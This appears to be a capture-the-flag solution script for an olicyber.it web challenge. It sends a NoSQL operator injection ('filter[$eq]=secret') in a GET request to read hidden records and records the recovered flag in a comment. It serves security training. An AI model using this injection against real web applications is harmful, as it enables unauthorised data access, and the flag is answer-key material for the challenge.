import requests

site = "http://bibbodb.challs.olicyber.it"

r = requests.get(f"{site}/type?filter[$eq]=secret").text
print(r)

#flag{alm3n0_n0n_3_un4_sql_inj3ct1on?}
